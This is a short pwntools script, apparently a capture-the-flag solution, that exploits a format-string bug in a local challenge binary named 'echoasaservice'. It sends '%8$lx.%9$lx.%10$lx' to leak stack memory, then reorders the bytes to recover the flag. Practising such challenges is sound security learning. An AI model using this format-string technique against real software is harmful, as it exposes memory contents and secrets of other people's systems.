from pwn import *

context.terminal = ['termite', '-e']

#p = gdb.debug('./easy_string_format', gdbscript='b *main+125\nc')
p = process('./echoasaservice')
p.recvline()
payload = bytearray()
payload += "%8$lx.%9$lx.%10$lx".encode()
p.sendline(payload)
flag = p.recvline().decode('utf-8').rstrip()
split = flag.split('.')
endian = "".join(["".join(reversed([j[i:i+2] for i in range(0, len(j), 2)])) for j in split])
print(bytearray.fromhex(endian).decode())
